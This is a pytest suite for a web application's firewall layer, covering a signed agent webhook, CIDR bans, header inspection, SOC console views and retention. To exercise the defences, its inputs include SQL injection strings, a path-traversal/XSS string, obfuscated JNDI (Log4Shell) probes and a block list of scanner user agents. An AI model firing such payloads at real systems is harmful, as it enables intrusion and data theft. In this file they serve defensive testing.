"""Firewall layers in the app (docs/FIREWALL.md):

  * the signed agent channel: POST /webhooks/firewall/events, GET /webhooks/firewall/blocklist
  * range (CIDR) bans, enforced per request and manageable from the SOC console
  * header inspection: JNDI probes, injection in User-Agent/Referer, attack-tool user agents
  * every refused request recorded as an 'app' firewall event
  * the SOC console's Firewall view
"""
import base64
import json
import time

import pytest

from utils import firewall_events, waf
from tests import test_soc_console as _console

soc = _console.soc
_fresh_soc_state = _console._fresh_soc_state

SECRET = "f" * 40
ATTACKER = "198.51.100.23"
RANGE = "198.51.100.0/24"
IN_RANGE = "198.51.100.77"
OTHER = "203.0.113.9"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"


@pytest.fixture(autouse=True)
def _clean(db_engine, monkeypatch):
    monkeypatch.setenv("FIREWALL_AGENT_SECRET", SECRET)
    monkeypatch.delenv("SOC_AUTO_BAN", raising=False)
    monkeypatch.delenv("WAF_BLOCK_SCANNER_UA", raising=False)

    def clear():
        cur = db_engine.cursor()
        cur.execute("DELETE FROM att_master.firewall_events")
        cur.execute("DELETE FROM att_master.firewall_sources")
        cur.execute("DELETE FROM public.banned_cidrs")
        for ip in (ATTACKER, IN_RANGE, OTHER, _console.PUBLIC_IP):
            cur.execute("DELETE FROM public.banned_ips WHERE ip=%s", (ip,))
            cur.execute("DELETE FROM att_master.soc_ban_reviews WHERE ip=%s", (ip,))
        db_engine.commit()
        cur.close()

    firewall_events.flush()
    clear()
    yield
    firewall_events.flush()
    clear()


def b64(text):
    return base64.b64encode(text.encode()).decode()


def signed(payload=None, *, secret=SECRET, ts=None, message=None):
    body = json.dumps(payload).encode() if payload is not None else b""
    ts = str(int(time.time())) if ts is None else ts
    sig = firewall_events.sign(message if message is not None else body, ts, secret)
    return body, {firewall_events.TIMESTAMP_HEADER: ts, firewall_events.SIGNATURE_HEADER: "sha256=" + sig}


def post_report(client, payload, **kw):
    body, headers = signed(payload, **kw)
    return client.post("/webhooks/firewall/events", data=body, content_type="application/json", headers=headers,
                       environ_overrides={"REMOTE_ADDR": "127.0.0.1"})


def get_blocklist(client, **kw):
    _, headers = signed(message=firewall_events.blocklist_message(), **kw)
    return client.get(firewall_events.BLOCKLIST_PATH, headers=headers, environ_overrides={"REMOTE_ADDR": "127.0.0.1"})


def rows(db_engine, where="TRUE", params=()):
    cur = db_engine.cursor()
    cur.execute("SELECT layer, action, src_ip, rule, path, detail, hits, source FROM att_master.firewall_events "
                "WHERE " + where + " ORDER BY id", params)
    out = cur.fetchall()
    cur.close()
    return out


def event(**kw):
    e = {"layer": "proxy", "action": "block", "ts": time.time(), "src_ip": ATTACKER, "rule": "949110"}
    e.update(kw)
    return e


class TestAgentChannel:
    def test_closed_without_a_secret(self, client, monkeypatch):
        monkeypatch.delenv("FIREWALL_AGENT_SECRET")
        assert post_report(client, {"source": "host-1", "events": []}).status_code == 404
        assert get_blocklist(client).status_code == 404

    def test_a_short_secret_keeps_it_closed(self, client, monkeypatch):
        monkeypatch.setenv("FIREWALL_AGENT_SECRET", "short")
        assert post_report(client, {"source": "host-1", "events": []}, secret="short").status_code == 404

    def test_bad_signature_and_stale_timestamp_are_refused(self, client):
        assert post_report(client, {"source": "host-1", "events": []}, secret="x" * 40).status_code == 401
        old = str(int(time.time()) - 3600)
        assert post_report(client, {"source": "host-1", "events": []}, ts=old).status_code == 401
        assert get_blocklist(client, secret="x" * 40).status_code == 401

    def test_report_is_stored_with_attack_text_decoded(self, client, db_engine):
        r = post_report(client, {"source": "host-1", "status": {"version": "1.0", "layers": {"proxy": {"ok": True}}},
                                 "events": [event(method="GET", host="hrzest.com", hits=3,
                                                  path_b64=b64("/x?id=1' UNION SELECT password FROM users--"),
                                                  detail_b64=b64("Inbound Anomaly Score Exceeded"))]})
        assert r.status_code == 200, r.get_data(as_text=True)
        assert r.get_json()["accepted"] == 1
        layer, action, ip, rule, path, detail, hits, source = rows(db_engine)[0]
        assert (layer, action, ip, rule, hits, source) == ("proxy", "block", ATTACKER, "949110", 3, "host-1")
        assert path == "/x?id=1' UNION SELECT password FROM users--"
        assert detail == "Inbound Anomaly Score Exceeded"
        cur = db_engine.cursor()
        cur.execute("SELECT events_total, status_json FROM att_master.firewall_sources WHERE source='host-1'")
        total, status = cur.fetchone()
        cur.close()
        assert total == 3 and json.loads(status)["version"] == "1.0"

    @pytest.mark.parametrize("bad", [
        {"layer": "app"},                       # only the app itself writes the app layer
        {"layer": "nonsense"},
        {"action": "explode"},
        {"src_ip": "not-an-ip"},
        {"ts": time.time() - 30 * 86400},       # implausibly old
        {"ts": "yesterday"},
        {"dst_port": 70000},
        {"hits": 0},
    ])
    def test_malformed_events_are_rejected_not_guessed(self, client, db_engine, bad):
        r = post_report(client, {"source": "host-1", "events": [event(**bad), event()]})
        assert r.status_code == 200
        assert r.get_json() == {"ok": True, "accepted": 1, "rejected": 1}
        assert len(rows(db_engine)) == 1

    def test_invalid_source_or_oversized_batch_is_refused(self, client):
        assert post_report(client, {"source": "app", "events": []}).status_code == 400
        assert post_report(client, {"source": "Bad Name!", "events": []}).status_code == 400
        too_many = [event()] * (firewall_events.MAX_BATCH + 1)
        assert post_report(client, {"source": "host-1", "events": too_many}).status_code == 400

    def test_a_fail2ban_ban_is_raised_for_an_analyst(self, client, db_engine):
        post_report(client, {"source": "host-1", "events": [
            event(layer="fail2ban", action="ban", rule="hrzest-modsec"),
            event(layer="fail2ban", action="ban", src_ip="10.0.0.5", rule="hrzest-modsec")]})
        cur = db_engine.cursor()
        cur.execute("SELECT status, source FROM att_master.soc_ban_reviews WHERE ip=%s", (ATTACKER,))
        assert cur.fetchone() == ("pending", "fail2ban")
        cur.execute("SELECT 1 FROM att_master.soc_ban_reviews WHERE ip='10.0.0.5'")
        assert cur.fetchone() is None          # a private address is never proposed
        cur.execute("SELECT 1 FROM public.banned_ips WHERE ip=%s", (ATTACKER,))
        assert cur.fetchone() is None          # proposed, not banned
        cur.close()

    def test_blocklist_carries_active_platform_bans_and_trusted_ranges(self, client, db_engine, monkeypatch):
        monkeypatch.setenv("WAF_NEVER_BAN_CIDRS", "203.0.113.0/28,10.9.0.0/16")
        assert waf.ban_ip(ATTACKER, "test", minutes=60)
        assert waf.ban_cidr("192.0.2.0/24", "test range", minutes=None)
        cur = db_engine.cursor()
        cur.execute("INSERT INTO public.banned_ips (ip, reason, expires_at) VALUES (%s, 'old', NOW() - INTERVAL '1 hour') "
                    "ON CONFLICT (ip) DO UPDATE SET expires_at = EXCLUDED.expires_at", (OTHER,))
        cur.execute("INSERT INTO att_master.soc_ban_reviews (ip, status, source, reason) VALUES (%s,'trusted','waf','office') "
                    "ON CONFLICT (ip) DO UPDATE SET status='trusted', trusted_until=NULL", (IN_RANGE,))
        db_engine.commit()
        cur.close()
        r = get_blocklist(client)
        assert r.status_code == 200
        d = r.get_json()
        cidrs = {b["cidr"] for b in d["block"]}
        assert f"{ATTACKER}/32" in cidrs and "192.0.2.0/24" in cidrs
        assert f"{OTHER}/32" not in cidrs                       # expired
        assert f"{IN_RANGE}/32" in d["trusted"]
        assert "203.0.113.0/28" in d["trusted"]                 # public never-ban range: exempt at the edge too
        assert "10.9.0.0/16" not in d["trusted"]                # private: meaningless at the edge
        cur = db_engine.cursor()
        cur.execute("DELETE FROM public.banned_cidrs WHERE cidr='192.0.2.0/24'")
        cur.execute("DELETE FROM att_master.soc_ban_reviews WHERE ip=%s", (IN_RANGE,))
        db_engine.commit()
        cur.close()

    def test_report_with_attack_text_passes_the_app_waf(self, client):
        """Encoded, the report about an attack is not itself blocked as one."""
        r = post_report(client, {"source": "host-1", "events": [
            event(path_b64=b64("/../../etc/passwd<script>alert(1)</script>"))]})
        assert r.status_code == 200


class TestRangeBans:
    def test_a_range_ban_refuses_every_address_in_it(self, client, db_engine):
        assert waf.ban_cidr(RANGE, "botnet range", minutes=60)
        r = client.get("/employee_forgot_password", environ_overrides={"REMOTE_ADDR": IN_RANGE})
        assert r.status_code == 403
        assert client.get("/employee_forgot_password", environ_overrides={"REMOTE_ADDR": OTHER}).status_code != 403
        assert ("app", "block", IN_RANGE, "cidr_ban") in [r[:4] for r in rows(db_engine)]

    def test_an_expired_range_ban_is_not_enforced(self, client, db_engine):
        cur = db_engine.cursor()
        cur.execute("INSERT INTO public.banned_cidrs (cidr, reason, expires_at) VALUES (%s, 'old', NOW() - INTERVAL '1 minute')",
                    (RANGE,))
        db_engine.commit()
        cur.close()
        assert client.get("/employee_forgot_password", environ_overrides={"REMOTE_ADDR": IN_RANGE}).status_code != 403

    @pytest.mark.parametrize("cidr,why", [
        ("198.0.0.0/8", "wider than /16"),
        ("10.0.0.0/16", "private"),
        ("100.64.0.0/16", "private"),
        ("2001:db8::/16", "wider than /32"),
        ("not/a-range", "not a valid"),
    ])
    def test_unsafe_ranges_are_refused(self, cidr, why):
        net, problem = waf.cidr_ban_problem(cidr)
        assert net is None and why.split()[0].lower() in problem.lower()
        assert not waf.ban_cidr(cidr, "x")

    def test_a_range_containing_the_analyst_is_refused(self):
        _, problem = waf.cidr_ban_problem(RANGE, actor_ip=IN_RANGE)
        assert "connected from" in problem

    def test_a_never_ban_range_cannot_be_covered(self, monkeypatch):
        monkeypatch.setenv("WAF_NEVER_BAN_CIDRS", "198.51.100.64/26")
        net, problem = waf.cidr_ban_problem(RANGE)
        assert net is None and "never-ban" in problem

    def test_single_address_range_is_stored_as_an_ip_ban(self, db_engine):
        assert waf.ban_cidr(f"{ATTACKER}/32", "one", minutes=5)
        cur = db_engine.cursor()
        cur.execute("SELECT 1 FROM public.banned_ips WHERE ip=%s", (ATTACKER,))
        assert cur.fetchone()
        cur.close()

    def test_soc_console_bans_lists_and_lifts_a_range(self, soc, db_engine):
        c, _ = soc("ana", "analyst")
        here = {"REMOTE_ADDR": _console.PUBLIC_IP}
        r = c.post("/socperson/api/bans", json={"ip": "198.51.100.5/24", "reason": "botnet", "minutes": 60},
                   environ_overrides=here)
        assert r.status_code == 200, r.get_data(as_text=True)
        listed = c.get("/socperson/api/bans", environ_overrides=here).get_json()["bans"]
        assert any(b["ip"] == RANGE and b.get("range") and b["active"] for b in listed)
        assert ("ana", "ban_ip", RANGE) in _console.audit_actions(db_engine)
        r = c.post("/socperson/api/bans/remove", json={"ip": RANGE}, environ_overrides=here)
        assert r.status_code == 200
        cur = db_engine.cursor()
        cur.execute("SELECT 1 FROM public.banned_cidrs WHERE cidr=%s", (RANGE,))
        assert cur.fetchone() is None
        cur.close()

    def test_soc_console_refuses_a_range_that_is_too_wide(self, soc):
        c, _ = soc("ana", "analyst")
        r = c.post("/socperson/api/bans", json={"ip": "198.0.0.0/8", "reason": "too much"},
                   environ_overrides={"REMOTE_ADDR": _console.PUBLIC_IP})
        assert r.status_code == 400 and "/16" in r.get_json()["msg"]


class TestHeaderInspection:
    def _get(self, client, path="/employee_forgot_password", **headers):
        return client.get(path, headers=headers, environ_overrides={"REMOTE_ADDR": ATTACKER})

    def test_an_ordinary_browser_passes(self, client):
        assert self._get(client, **{"User-Agent": BROWSER_UA, "Referer": "https://hrzest.com/acme/admin?tab=o'brien"}).status_code != 403

    @pytest.mark.parametrize("ua", ["sqlmap/1.8#stable (https://sqlmap.org)", "Mozilla/5.0 (compatible; Nuclei)",
                                    "Nikto/2.5.0", "Mozilla/5.00 (Nikto/2.1.6)"])
    def test_attack_tools_are_refused_and_recorded(self, client, db_engine, ua):
        assert self._get(client, **{"User-Agent": ua}).status_code == 403
        assert ("app", "block", ATTACKER, "waf.scanner_ua_blocked") in [r[:4] for r in rows(db_engine)]

    def test_attack_tools_are_refused_on_the_login_endpoints_too(self, client):
        r = client.post("/api/login", json={"username": "a", "password": "b"}, headers={"User-Agent": "sqlmap/1.8"},
                        environ_overrides={"REMOTE_ADDR": ATTACKER})
        assert r.status_code == 403

    def test_scanner_blocking_can_be_turned_off(self, client, monkeypatch):
        monkeypatch.setenv("WAF_BLOCK_SCANNER_UA", "false")
        assert self._get(client, **{"User-Agent": "Nikto/2.5.0"}).status_code != 403

    @pytest.mark.parametrize("value", ["${jndi:ldap://x.example/a}", "${${lower:j}ndi:rmi://x/a}", "${${::-j}${::-n}di:dns://x}"])
    def test_jndi_probes_in_any_header_are_refused(self, client, value):
        assert self._get(client, **{"X-Api-Version": value, "User-Agent": BROWSER_UA}).status_code == 403

    def test_injection_in_user_agent_or_referer_is_refused(self, client):
        assert self._get(client, **{"User-Agent": "x' UNION SELECT password FROM users--"}).status_code == 403
        assert self._get(client, **{"User-Agent": BROWSER_UA, "Referer": "https://x/<script>alert(1)</script>"}).status_code == 403

    def test_the_honeypot_still_sees_scanners_first(self, client, db_engine):
        r = self._get(client, "/.env", **{"User-Agent": "sqlmap/1.8"})
        assert r.status_code == 404                     # the decoy answered, not the WAF
        cur = db_engine.cursor()
        cur.execute("SELECT source FROM att_master.soc_ban_reviews WHERE ip=%s", (ATTACKER,))
        assert cur.fetchone() == ("honeypot",)
        cur.close()


class TestAppBlocksAreRecorded:
    def test_a_waf_block_and_an_ip_ban_land_in_the_firewall_view(self, client, db_engine):
        client.get("/employee_forgot_password", query_string={"q": "1 UNION SELECT password FROM users"},
                   environ_overrides={"REMOTE_ADDR": ATTACKER})
        assert waf.ban_ip(OTHER, "test", minutes=5)
        for _ in range(3):
            client.get("/employee_forgot_password", environ_overrides={"REMOTE_ADDR": OTHER})
        got = rows(db_engine)
        assert ("app", "block", ATTACKER, "waf.sqli_blocked") in [r[:4] for r in got]
        assert sum(r[6] for r in got if r[2] == OTHER and r[3] == "ip_ban") == 3

    def test_repeats_are_aggregated_before_they_reach_the_database(self, db_engine, monkeypatch):
        from utils import async_writer
        monkeypatch.setattr(async_writer, "_SYNCHRONOUS_MODE", False)
        monkeypatch.setattr(firewall_events, "_ensure_flusher", lambda: None)
        written = []
        monkeypatch.setattr(async_writer, "enqueue_write", lambda fn, *a, **k: written.append(a[0]))
        for _ in range(50):
            firewall_events.record_app_block("ip_ban", ip=ATTACKER, method="GET", path="/x")
        firewall_events.record_app_block("ip_ban", ip=OTHER, method="GET", path="/x")
        firewall_events.flush()
        assert len(written) == 1
        hits = {r["src_ip"]: r["hits"] for r in written[0]}
        assert hits == {ATTACKER: 50, OTHER: 1}

    def test_the_writer_says_it_runs_inline_under_the_suite(self):
        """record_app_block() asks the writer this; when the function went
        missing, every app block silently stayed in memory."""
        from utils import async_writer
        assert async_writer.is_synchronous_mode() is True

    def test_a_failing_mode_check_still_records_in_the_background(self, monkeypatch):
        from utils import async_writer

        def gone():
            raise ImportError("is_synchronous_mode")
        monkeypatch.setattr(async_writer, "is_synchronous_mode", gone)
        started = []
        monkeypatch.setattr(firewall_events, "_ensure_flusher", lambda: started.append(True))
        firewall_events.record_app_block("ip_ban", ip=ATTACKER, method="GET", path="/x")
        assert started == [True]

    def test_recording_never_raises(self, monkeypatch):
        from utils import client_ip

        def boom(_ip):
            raise RuntimeError("anything going wrong inside")
        monkeypatch.setattr(client_ip, "parse_ip", boom)
        firewall_events.record_app_block("ip_ban", ip=ATTACKER)


class TestConsoleView:
    # Sign in before posting through `client`: that fixture keeps its last
    # request context alive, and a console session started after it would
    # share that request's app context (a test-client artefact, not the app).
    def test_overview_counts_layers_and_leaves_out_internal_addresses(self, soc, client, monkeypatch):
        monkeypatch.setenv("SOC_TEST_CIDRS", "192.0.2.0/24")
        c, _ = soc("viv", "viewer")
        post_report(client, {"source": "host-1", "status": {"version": "1.0"}, "events": [
            event(layer="edge", action="block", hits=4, rule="AWS-AWSManagedRulesSQLiRuleSet"),
            event(layer="edge", action="allow", src_ip=None, hits=1000, rule="ALL"),
            event(layer="host", action="block", src_ip=OTHER, dst_port=3389, protocol="tcp", rule="FW-DROP"),
            event(layer="host", action="block", src_ip="10.0.0.9", dst_port=22, rule="FW-DROP"),
            event(layer="proxy", action="block", src_ip="192.0.2.50")]})
        r = c.get("/socperson/api/firewall?hours=24", environ_overrides={"REMOTE_ADDR": _console.PUBLIC_IP})
        assert r.status_code == 200, r.get_data(as_text=True)[:2000]
        d = r.get_json()
        layers = {x["layer"]: x for x in d["layers"]}
        assert layers["edge"]["block"] == 4 and layers["edge"]["allow"] == 1000
        assert layers["host"]["block"] == 1                       # the private 10.0.0.9 drop is left out
        assert layers["proxy"]["block"] == 0                      # SOC_TEST_CIDRS
        assert d["excluded"] == {"internal": 1, "test": 1}
        assert d["top_sources"][0]["ip"] == ATTACKER
        assert [r["source"] for r in d["reporters"]] == ["host-1"] and not d["reporters"][0]["stale"]

    def test_events_filter_by_layer_and_address(self, soc, client):
        c, _ = soc("viv", "viewer")
        post_report(client, {"source": "host-1", "events": [
            event(layer="host", rule="FW-DROP"), event(layer="proxy", src_ip=OTHER)]})
        here = {"REMOTE_ADDR": _console.PUBLIC_IP}
        got = c.get("/socperson/api/firewall/events?layer=host", environ_overrides=here).get_json()["events"]
        assert [e["layer"] for e in got] == ["host"]
        got = c.get(f"/socperson/api/firewall/events?ip={OTHER}", environ_overrides=here).get_json()["events"]
        assert [e["src_ip"] for e in got] == [OTHER]
        assert c.get("/socperson/api/firewall/events?ip=garbage", environ_overrides=here).get_json()["events"] == []

    def test_posture_says_whether_the_layers_report(self, monkeypatch, client, db_engine):
        from utils import soc_queries

        def firewall_check():
            return next(c for c in soc_queries.posture()["checks"] if c["id"] == "firewall")
        monkeypatch.delenv("FIREWALL_AGENT_SECRET")
        assert firewall_check()["status"] == "warn"
        monkeypatch.setenv("FIREWALL_AGENT_SECRET", SECRET)
        assert "no firewall agent has reported" in firewall_check()["detail"]
        post_report(client, {"source": "host-1", "events": []})
        assert firewall_check()["status"] == "pass"
        cur = db_engine.cursor()
        cur.execute("UPDATE att_master.firewall_sources SET last_seen = NOW() - INTERVAL '1 hour' WHERE source='host-1'")
        db_engine.commit()
        cur.close()
        check = firewall_check()
        assert check["status"] == "warn" and "host-1" in check["detail"]
        assert SECRET not in str(soc_queries.posture())

    def test_view_needs_a_console_session(self, client):
        assert client.get("/socperson/api/firewall").status_code in (302, 401, 404)


class TestRetention:
    def test_old_decisions_are_purged(self, db_engine, monkeypatch):
        monkeypatch.setenv("FIREWALL_EVENT_RETENTION_DAYS", "30")
        cur = db_engine.cursor()
        cur.execute("INSERT INTO att_master.firewall_events (occurred_at, layer, action, src_ip, source) VALUES "
                    "(NOW() - INTERVAL '40 days', 'host', 'block', %s, 'host-1'), "
                    "(NOW() - INTERVAL '1 day', 'host', 'block', %s, 'host-1')", (ATTACKER, OTHER))
        db_engine.commit()
        cur.close()
        assert firewall_events.purge_old_events() == 1
        assert [r[2] for r in rows(db_engine)] == [OTHER]
